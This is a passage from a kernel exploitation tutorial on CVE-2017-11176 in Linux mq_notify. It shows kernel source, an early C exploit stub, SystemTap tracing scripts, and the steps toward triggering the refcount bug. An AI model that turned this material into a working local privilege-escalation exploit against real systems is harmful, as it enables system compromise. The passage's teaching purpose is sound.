</code></pre></div><p>The code checks that the userland provided argument <em>u_notification</em> is not NULL [0] and uses it to make a local copy into [1] kernel memory (<em>notification</em>).</p><p>Next, we see a series of <em>sanity</em> checks based on the userland-provided <strong>struct sigevent</strong>:</p><div class="highlight"><pre><span></span><code><span class="w">      </span><span class="n">nc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="n">sock</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"></span>
<span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="w">   </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">u_notification</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="p">[</span><span class="mi">3</span><span class="n">a</span><span class="p">]</span><span class="w">     </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="n">notification</span><span class="p">.</span><span class="n">sigev_notify</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">SIGEV_NONE</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"></span>
<span class="w">               </span><span class="n">notification</span><span class="p">.</span><span class="n">sigev_notify</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">SIGEV_SIGNAL</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"></span>
<span class="w">               </span><span class="n">notification</span><span class="p">.</span><span class="n">sigev_notify</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">SIGEV_THREAD</span><span class="p">))</span><span class="w"></span>
<span class="w">          </span><span class="k">return</span><span class="w"> </span><span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span><span class="w"></span>
<span class="p">[</span><span class="mi">3</span><span class="n">b</span><span class="p">]</span><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">notification</span><span class="p">.</span><span class="n">sigev_notify</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">SIGEV_SIGNAL</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"></span>
<span class="w">          </span><span class="o">!</span><span class="n">valid_signal</span><span class="p">(</span><span class="n">notification</span><span class="p">.</span><span class="n">sigev_signo</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">          </span><span class="k">return</span><span class="w"> </span><span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="p">}</span><span class="w"></span>
<span class="p">[</span><span class="mi">3</span><span class="n">c</span><span class="p">]</span><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">notification</span><span class="p">.</span><span class="n">sigev_notify</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">SIGEV_THREAD</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">          </span><span class="kt">long</span><span class="w"> </span><span class="n">timeo</span><span class="p">;</span><span class="w"></span>

<span class="w">          </span><span class="cm">/* create the notify skb */</span><span class="w"></span>
<span class="w">          </span><span class="n">nc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">alloc_skb</span><span class="p">(</span><span class="n">NOTIFY_COOKIE_LEN</span><span class="p">,</span><span class="w"> </span><span class="n">GFP_KERNEL</span><span class="p">);</span><span class="w"></span>
<span class="w">          </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">nc</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">            </span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">-</span><span class="n">ENOMEM</span><span class="p">;</span><span class="w"></span>
<span class="w">            </span><span class="k">goto</span><span class="w"> </span><span class="n">out</span><span class="p">;</span><span class="w"></span>
<span class="w">          </span><span class="p">}</span><span class="w"></span>
<span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="w">       </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">copy_from_user</span><span class="p">(</span><span class="n">nc</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">,</span><span class="w"></span>
<span class="w">              </span><span class="n">notification</span><span class="p">.</span><span class="n">sigev_value</span><span class="p">.</span><span class="n">sival_ptr</span><span class="p">,</span><span class="w"></span>
<span class="w">              </span><span class="n">NOTIFY_COOKIE_LEN</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">            </span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span><span class="w"></span>
<span class="w">            </span><span class="k">goto</span><span class="w"> </span><span class="n">out</span><span class="p">;</span><span class="w"></span>
<span class="w">          </span><span class="p">}</span><span class="w"></span>

<span class="w">          </span><span class="cm">/* TODO: add a header? */</span><span class="w"></span>
<span class="w">          </span><span class="n">skb_put</span><span class="p">(</span><span class="n">nc</span><span class="p">,</span><span class="w"> </span><span class="n">NOTIFY_COOKIE_LEN</span><span class="p">);</span><span class="w"></span>
<span class="w">          </span><span class="cm">/* and attach it to the socket */</span><span class="w"></span>

<span class="w">    </span><span class="nl">retry</span><span class="p">:</span><span class="w">                                    </span><span class="c1">// &lt;---- we want to reach this!</span>
<span class="w">            </span><span class="n">filp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fget</span><span class="p">(</span><span class="n">notification</span><span class="p">.</span><span class="n">sigev_signo</span><span class="p">);</span><span class="w"></span>
</code></pre></div><p>If the provided argument is non-NULL [2], the <em>sigev_notify</em> value is checked three times ([3a], [3b], [3c]). Another <em>copy_from_user()</em> is invoked at [4] based on the user-provided <em>notification.sigev_value_sival_ptr</em> value. This needs to point to a valid userland <em>readable</em> data/buffer, otherwise <em>copy_from_user()</em> will fail.</p><p>As a reminder, the <em>struct sigevent</em> is declared here:</p><div class="highlight"><pre><span></span><code><span class="w">    </span><span class="c1">// [include/asm-generic/siginfo.h]</span>

<span class="w">    </span><span class="k">typedef</span><span class="w"> </span><span class="k">union</span> <span class="nc">sigval</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">      </span><span class="kt">int</span><span class="w"> </span><span class="n">sival_int</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="kt">void</span><span class="w"> </span><span class="n">__user</span><span class="w"> </span><span class="o">*</span><span class="n">sival_ptr</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="kt">sigval_t</span><span class="p">;</span><span class="w"></span>

<span class="w">    </span><span class="k">typedef</span><span class="w"> </span><span class="k">struct</span> <span class="nc">sigevent</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">      </span><span class="kt">sigval_t</span><span class="w"> </span><span class="n">sigev_value</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="kt">int</span><span class="w"> </span><span class="n">sigev_signo</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="kt">int</span><span class="w"> </span><span class="n">sigev_notify</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="k">union</span> <span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">_pad</span><span class="p">[</span><span class="n">SIGEV_PAD_SIZE</span><span class="p">];</span><span class="w"></span>
<span class="w">         </span><span class="kt">int</span><span class="w"> </span><span class="n">_tid</span><span class="p">;</span><span class="w"></span>

<span class="w">        </span><span class="k">struct</span> <span class="p">{</span><span class="w"></span>
<span class="w">          </span><span class="kt">void</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="n">_function</span><span class="p">)(</span><span class="kt">sigval_t</span><span class="p">);</span><span class="w"></span>
<span class="w">          </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">_attribute</span><span class="p">;</span><span class="w"> </span><span class="cm">/* really pthread_attr_t */</span><span class="w"></span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="n">_sigev_thread</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="p">}</span><span class="w"> </span><span class="n">_sigev_un</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="n">sigevent_t</span><span class="p">;</span><span class="w"></span>
</code></pre></div><p>In the end, to enter the <em>retry path</em> at least once, we need to proceed as follows:</p><ol><li>Provide a non-NULL <em>u_notification</em> argument</li><li>Set <em>u_notification.sigev_notify</em> to <em>SIGEV_THREAD</em></li><li>The value pointed by <em>notification.sigev_value.sival_ptr</em> must be a valid <em>readable userland</em> address of at least <em>NOTIFY_COOKIE_LEN (=32)</em> bytes (cf. [include/linux/mqueue.h])</li></ol><h2 id="the-first-exploit-stub">The first exploit stub</h2><p>Let's start coding the exploit and validate that everything is fine.</p><div class="highlight"><pre><span></span><code><span class="w">    </span><span class="cm">/*</span>
<span class="cm">     * CVE-2017-11176 Exploit.</span>
<span class="cm">     */</span><span class="w"></span>

<span class="w">    </span><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;mqueue.h&gt;</span><span class="cp"></span>
<span class="w">    </span><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="w">    </span><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>


<span class="w">    </span><span class="cp">#define NOTIFY_COOKIE_LEN (32)</span>


<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="p">{</span><span class="w"></span>
<span class="w">      </span><span class="k">struct</span> <span class="nc">sigevent</span><span class="w"> </span><span class="n">sigev</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="kt">char</span><span class="w"> </span><span class="n">sival_buffer</span><span class="p">[</span><span class="n">NOTIFY_COOKIE_LEN</span><span class="p">];</span><span class="w"></span>

<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">"-={ CVE-2017-11176 Exploit }=-</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>

<span class="w">      </span><span class="c1">// initialize the sigevent structure</span>
<span class="w">      </span><span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sigev</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">sigev</span><span class="p">));</span><span class="w"></span>
<span class="w">      </span><span class="n">sigev</span><span class="p">.</span><span class="n">sigev_notify</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">SIGEV_THREAD</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="n">sigev</span><span class="p">.</span><span class="n">sigev_value</span><span class="p">.</span><span class="n">sival_ptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sival_buffer</span><span class="p">;</span><span class="w"></span>

<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">mq_notify</span><span class="p">((</span><span class="n">mqd_t</span><span class="p">)</span><span class="mi">-1</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">sigev</span><span class="p">))</span><span class="w"></span>
<span class="w">      </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="n">perror</span><span class="p">(</span><span class="s">"mqnotify"</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="k">goto</span><span class="w"> </span><span class="n">fail</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="p">}</span><span class="w"></span>
<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">"mqnotify succeed</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>

<span class="w">      </span><span class="c1">// TODO: exploit</span>

<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>

<span class="w">    </span><span class="nl">fail</span><span class="p">:</span><span class="w"></span>
<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">"exploit failed!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
</code></pre></div><p>It is recommended to use a <em>Makefile</em> to ease the exploit development (<em>build-and-run</em> scripts are always handy). In order to compile it, you will need to link the binary with the <strong>-lrt</strong> flags that is required to use <em>mq_notify</em> (from the 'man'). In addition, it is recommenced to use the <strong>-O0</strong> option to prevent gcc from re-ordering our code (it can lead to hard-to-debug bugs).</p><div class="highlight"><pre><span></span><code>-<span class="o">={</span> CVE-2017-11176 Exploit <span class="o">}=</span>-
mqnotify: Bad file descriptor
exploit failed!
</code></pre></div><p>Alright, <em>mq_notify</em> returned "Bad file descriptor" which is equivalent to "-EBADF". There are three places where this error is emitted. It could be one of the <em>fget()</em> calls, or the later <em>(filp-&gt;f_op != &amp;mqueue_file_operations)</em> check. Let's figure it out!</p><h2 id="hello-system-tap">Hello System Tap!</h2><p>During early stage of exploit development, it is <em>highly recommended</em> to run the exploit in a kernel with debug symbols, it allows to use <strong>SystemTap</strong>! SystemTap is a great tool to live probe the kernel without going into gdb. It makes sequence visualization easy.</p><p>Let's start with basic System Tap (stap) scripts:</p><div class="highlight"><pre><span></span><code>    <span class="c1"># mq_notify.stp</span>

    probe syscall.mq_notify
    <span class="o">{</span>
      <span class="k">if</span> <span class="o">(</span>execname<span class="o">()</span> <span class="o">==</span> <span class="s2">"exploit"</span><span class="o">)</span>
      <span class="o">{</span>
        printf<span class="o">(</span><span class="s2">"\n\n(%d-%d) &gt;&gt;&gt; mq_notify (%s)\n"</span>, pid<span class="o">()</span>, tid<span class="o">()</span>, argstr<span class="o">)</span>
      <span class="o">}</span>
    <span class="o">}</span>

    probe syscall.mq_notify.return
    <span class="o">{</span>
      <span class="k">if</span> <span class="o">(</span>execname<span class="o">()</span> <span class="o">==</span> <span class="s2">"exploit"</span><span class="o">)</span>
      <span class="o">{</span>
        printf<span class="o">(</span><span class="s2">"(%d-%d) &lt;&lt;&lt; mq_notify = %x\n\n\n"</span>, pid<span class="o">()</span>, tid<span class="o">()</span>, <span class="nv">$return</span><span class="o">)</span>
      <span class="o">}</span>
    <span class="o">}</span>
</code></pre></div><p>The previous script installs two probes that will be respectively called <strong>before</strong> and <strong>after</strong> the syscall invocation.</p><p>Dumping both the <em>pid()</em> and <em>tid()</em> helps a lot while debugging multiple threads. In addition, using the <em>(execname() == "exploit")</em> clause allows to limit the output.</p><p><strong>WARNING</strong>: If there is <em>too much</em> output, systemtap might silently discard some lines!</p><p>Now run the script with...</p><div class="highlight"><pre><span></span><code>stap -v mq_notify.stp
</code></pre></div><p>...and launch the exploit:</p><div class="highlight"><pre><span></span><code>(14427-14427) &gt;&gt;&gt; mq_notify (-1, 0x7ffdd7421400)
(14427-14427) &lt;&lt;&lt; mq_notify = fffffffffffffff7
</code></pre></div><p>Alright, the probes seem to work. We can see that both arguments of the <em>mq_notify()</em> syscall somehow match our own call (i.e. we set "-1" in the first parameter and 0x7ffdd7421400 looks like a userland address). It also returned fffffffffffffff7, that is <em>-EBADF</em> (=-9). Let's add some more probes.</p><p>Unlike <em>syscall</em> hooks (function starting with "SYSCALL_DEFINE*"), normal kernel functions can be hooked with the following syntax:</p><div class="highlight"><pre><span></span><code>    probe kernel.function <span class="o">(</span><span class="s2">"fget"</span><span class="o">)</span>
    <span class="o">{</span>
      <span class="k">if</span> <span class="o">(</span>execname<span class="o">()</span> <span class="o">==</span> <span class="s2">"exploit"</span><span class="o">)</span>
      <span class="o">{</span>
        printf<span class="o">(</span><span class="s2">"(%d-%d) [vfs] ==&gt;&gt; fget (%s)\n"</span>, pid<span class="o">()</span>, tid<span class="o">()</span>, <span class="nv">$$</span>parms<span class="o">)</span>
      <span class="o">}</span>
    <span class="o">}</span>
</code></pre></div><p><strong>WARNING</strong>: For some reason, not all kernel functions are hookable. For instance "inlined" might or might not be hookable (it depends if the inlining actually occurred). In addition, some functions (e.g. copy_from_user() here) can have a hook <strong>before</strong> the call but not <strong>after</strong> (i.e. while returning). In any case, System Tap will notify you and refuses to launch the script.</p><p>Let's add a probe to every function invoked in <em>mq_notify()</em> to see the code flowing and re-run the exploit:</p><div class="highlight"><pre><span></span><code>(17850-17850) [SYSCALL] ==&gt;&gt; mq_notify (-1, 0x7ffc30916f50)
(17850-17850) [uland] ==&gt;&gt; copy_from_user ()
(17850-17850) [skb] ==&gt;&gt; alloc_skb (priority=0xd0 size=0x20)
(17850-17850) [uland] ==&gt;&gt; copy_from_user ()
(17850-17850) [skb] ==&gt;&gt; skb_put (skb=0xffff88002e061200 len=0x20)
(17850-17850) [skb] &lt;&lt;== skb_put = ffff88000a187600
(17850-17850) [vfs] ==&gt;&gt; fget (fd=0x3)
(17850-17850) [vfs] &lt;&lt;== fget = ffff88002e271280
(17850-17850) [netlink] ==&gt;&gt; netlink_getsockbyfilp (filp=0xffff88002e271280)
(17850-17850) [netlink] &lt;&lt;== netlink_getsockbyfilp = ffff88002ff82800
(17850-17850) [netlink] ==&gt;&gt; netlink_attachskb (sk=0xffff88002ff82800 skb=0xffff88002e061200 timeo=0xffff88002e1f3f40 ssk=0x0)
(17850-17850) [netlink] &lt;&lt;== netlink_attachskb = 0
(17850-17850) [vfs] ==&gt;&gt; fget (fd=0xffffffff)
(17850-17850) [vfs] &lt;&lt;== fget = 0
(17850-17850) [netlink] ==&gt;&gt; netlink_detachskb (sk=0xffff88002ff82800 skb=0xffff88002e061200)
(17850-17850) [netlink] &lt;&lt;== netlink_detachskb
(17850-17850) [SYSCALL] &lt;&lt;== mq_notify= -9
</code></pre></div><p><strong>UPDATE(2018-10-22)</strong>: On the suggested ISO, the syscall code invokes <em>fdget()</em> instead of <em>fget()</em>. Read the code and modify your probes accordingly.</p><h2 id="the-first-bug">The first bug!</h2><p>It seems that we correctly reach the <em>retry path</em> since we have the following sequence:</p><ol><li><strong>copy_from_user</strong>: our pointer is not null</li><li><strong>alloc_skb</strong>: we passed the SIGEV_THREAD condition</li><li><strong>copy_from_user</strong>: picking our <em>sival_buffer</em></li><li><strong>skb_put</strong>: means the previous <em>copy_from_user()</em> did not fail</li><li><strong>fget(fd=0x3)</strong>: &lt;--- ???</li></ol><p>Hmm... something is already wrong... We did not provide any file descriptor in <strong>notification.sigev_signo</strong>, it is supposed to be zero (not 3):</p><div class="highlight"><pre><span></span><code><span class="w">      </span><span class="c1">// initialize the sigevent structure</span>
<span class="w">      </span><span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sigev</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">sigev</span><span class="p">));</span><span class="w"></span>
<span class="w">      </span><span class="n">sigev</span><span class="p">.</span><span class="n">sigev_notify</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">SIGEV_THREAD</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="n">sigev</span><span class="p">.</span><span class="n">sigev_value</span><span class="p">.</span><span class="n">sival_ptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sival_buffer</span><span class="p">;</span><span class="w"></span>
</code></pre></div><p>Nevertheless, the first call to <em>fget()</em> didn't fail. In addition both <em>netlink_getsockbyfilp()</em> and <em>netlink_attachskb()</em> worked! That is also odd since we didn't create any <em>AF_NETLINK</em> socket.</p><p>This is the <strong>second <em>fget()</em></strong> that actually failed because we set "-1" (0xffffffff) in the first argument of <em>mq_notify()</em>. So, what's wrong?</p><p>Let's pull back and print our <strong>sigevent</strong> pointer, and compare it with the value passed to the syscall:</p><div class="highlight"><pre><span></span><code><span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"sigev = 0x%p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">sigev</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">mq_notify</span><span class="p">((</span><span class="n">mqd_t</span><span class="p">)</span><span class="w"> </span><span class="mi">-1</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">sigev</span><span class="p">))</span><span class="w"></span>
</code></pre></div><div class="highlight"><pre><span></span><code>-={ CVE-2017-11176 Exploit }=-
sigev = 0x0x7ffdd9257f00        // &lt;------
mq_notify: Bad file descriptor
exploit failed!
</code></pre></div><div class="highlight"><pre><span></span><code>(18652-18652) [SYSCALL] ==&gt;&gt; mq_notify (-1, 0x7ffdd9257e60)
</code></pre></div><p>Obviously, the structure passed to the <em>syscall</em> mq_notify <em>is not</em> the same we provided in our exploit. It means that either <em>system tap</em> is bugged (that is possible) or...</p><p><strong>...we've just been screwed by some library wrapper!</strong></p><p>Let's fix this and invoke <em>mq_notify</em> through the <strong>syscall()</strong> syscall.</p><p>First add the following headers, as well as our <em>own</em> wrapper:</p><div class="highlight"><pre><span></span><code><span class="w">    </span><span class="cp">#define _GNU_SOURCE</span>
<span class="w">    </span><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
<span class="w">    </span><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/syscall.h&gt;</span><span class="cp"></span>

<span class="w">    </span><span class="cp">#define _mq_notify(mqdes, sevp) syscall(__NR_mq_notify, mqdes, sevp)</span>
</code></pre></div><p>Also, remember to remove that "-lrt" line in the Makefile (we now use the syscall directly).</p><p>Explicitly set <em>sigev_signo</em> to '-1' since 0 is actually a valid file descriptor, and uses the wrapper:</p><div class="highlight"><pre><span></span><code><span class="w">      </span><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
<span class="w">      </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="c1">// ... cut ...</span>

<span class="w">        </span><span class="n">sigev</span><span class="p">.</span><span class="n">sigev_signo</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span><span class="w"></span>

<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">"sigev = 0x%p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">sigev</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">_mq_notify</span><span class="p">((</span><span class="n">mqd_t</span><span class="p">)</span><span class="mi">-1</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">sigev</span><span class="p">))</span><span class="w"></span>

<span class="w">        </span><span class="c1">// ... cut ...</span>
<span class="w">      </span><span class="p">}</span><span class="w"></span>
</code></pre></div><p>And run it:</p><div class="highlight"><pre><span></span><code>-={ CVE-2017-11176 Exploit }=-
sigev = 0x0x7fffb7eab660
mq_notify: Bad file descriptor
exploit failed!

(18771-18771) [SYSCALL] ==&gt;&gt; mq_notify (-1, 0x7fffb7eab660)           // &lt;--- as expected!
(18771-18771) [uland] ==&gt;&gt; copy_from_user ()
(18771-18771) [skb] ==&gt;&gt; alloc_skb (priority=0xd0 size=0x20)
(18771-18771) [uland] ==&gt;&gt; copy_from_user ()
(18771-18771) [skb] ==&gt;&gt; skb_put (skb=0xffff88003d2e95c0 len=0x20)
(18771-18771) [skb] &lt;&lt;== skb_put = ffff88000a0a2200
(18771-18771) [vfs] ==&gt;&gt; fget (fd=0xffffffff)                         // &lt;---- that's better!
(18771-18771) [vfs] &lt;&lt;== fget = 0
(18771-18771) [SYSCALL] &lt;&lt;== mq_notify= -9
</code></pre></div><p>This time, we directly go into the <em>out</em> label after the first failed <em>fget()</em> (as expected).</p><p>So far, we know that we can reach the "retry" label (at least once) without being stopped by any security check. A common trap has been exposed (caused by library wrapper instead of syscall), and we saw how to fix it. In order to avoid the same kind of bug in the future, we will wrap every syscall.</p><p>Let's move on and trigger the bug with the help of System Tap.</p><hr><h1 id="forcing-the-trigger">Forcing the Trigger</h1><p>Sometimes you quickly want to <strong>validate an idea without unrolling all the kernel code</strong>. In this section, we will use <em>System Tap Guru Mode</em> to modify kernel data structures and force a particular kernel path.</p><p>In other words, we will <strong>trigger the bug from kernel-land</strong>. The idea is that if we can't even trigger it from kernel-land, there is no way we can do it from user-land. So, let's satisfy every requirement first by modifying the kernel, and then implement them one-by-one in userland (cf. part 2).</p><p>As a reminder, we can trigger the bug if:</p><ol><li>We reach the "retry logic" (loop back to the retry label). That is, we need to enter <em>netlink_attachskb()</em> first, and make it return 1. The <em>sock</em> refcounter will be decreased by one.</li><li>After looping back to the <em>retry</em> label (goto retry), the next call to <em>fget()</em> must return NULL, so we can hit the exit path (<em>out</em> label) and decrease <em>sock</em>'s refcounter a second time.</li></ol><h2 id="reaching-netlink_attachskb">Reaching <em>netlink_attachskb()</em></h2><p>In the previous section, we showed that it is required that <strong>netlink_attachskb()</strong> returns 1 to trigger the bug. However, there are several requirements before reaching it:</p><ol><li>We need to provide a <em>valid</em> file descriptor, so the first call to <em>fget()</em> doesn't fail</li><li>The file pointed by the file descriptor should be a <strong>socket of type <em>AF_NETLINK</em></strong></li></ol><p>That is, we should pass all checks gracefully:</p><div class="highlight"><pre><span></span><code><span class="w">    </span><span class="nl">retry</span><span class="p">:</span><span class="w"></span>
<span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w">       </span><span class="n">filp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fget</span><span class="p">(</span><span class="n">notification</span><span class="p">.</span><span class="n">sigev_signo</span><span class="p">);</span><span class="w"></span>
<span class="w">          </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">filp</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">            </span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">-</span><span class="n">EBADF</span><span class="p">;</span><span class="w"></span>
<span class="w">            </span><span class="k">goto</span><span class="w"> </span><span class="n">out</span><span class="p">;</span><span class="w"></span>
<span class="w">          </span><span class="p">}</span><span class="w"></span>
<span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w">       </span><span class="n">sock</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">netlink_getsockbyfilp</span><span class="p">(</span><span class="n">filp</span><span class="p">);</span><span class="w"></span>
<span class="w">          </span><span class="n">fput</span><span class="p">(</span><span class="n">filp</span><span class="p">);</span><span class="w"></span>
<span class="w">          </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">IS_ERR</span><span class="p">(</span><span class="n">sock</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">            </span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">PTR_ERR</span><span class="p">(</span><span class="n">sock</span><span class="p">);</span><span class="w"></span>
<span class="w">            </span><span class="n">sock</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"></span>
<span class="w">            </span><span class="k">goto</span><span class="w"> </span><span class="n">out</span><span class="p">;</span><span class="w"></span>
<span class="w">          </span><span class="p">}</span><span class="w"></span>
</code></pre></div><p>Passing the first check [0] is easy, just provide a valid file descriptor (with <em>open()</em>, <em>socket()</em>, whatever). Nevertheless, it is better to directly use the proper type otherwise the second check [1] will fail:</p><div class="highlight"><pre><span></span><code><span class="w">    </span><span class="k">struct</span> <span class="nc">sock</span><span class="w"> </span><span class="o">*</span><span class="n">netlink_getsockbyfilp</span><span class="p">(</span><span class="k">struct</span> <span class="nc">file</span><span class="w"> </span><span class="o">*</span><span class="n">filp</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="p">{</span><span class="w"></span>
<span class="w">      </span><span class="k">struct</span> <span class="nc">inode</span><span class="w"> </span><span class="o">*</span><span class="n">inode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">filp</span><span class="o">-&gt;</span><span class="n">f_path</span><span class="p">.</span><span class="n">dentry</span><span class="o">-&gt;</span><span class="n">d_inode</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="k">struct</span> <span class="nc">sock</span><span class="w"> </span><span class="o">*</span><span class="n">sock</span><span class="p">;</span><span class="w"></span>

<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">S_ISSOCK</span><span class="p">(</span><span class="n">inode</span><span class="o">-&gt;</span><span class="n">i_mode</span><span class="p">))</span><span class="w">         </span><span class="c1">// &lt;--- this need to be a socket...</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">ERR_PTR</span><span class="p">(</span><span class="o">-</span><span class="n">ENOTSOCK</span><span class="p">);</span><span class="w"></span>

<span class="w">      </span><span class="n">sock</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">SOCKET_I</span><span class="p">(</span><span class="n">inode</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">sk</span><span class="p">;</span><span class="w"></span>
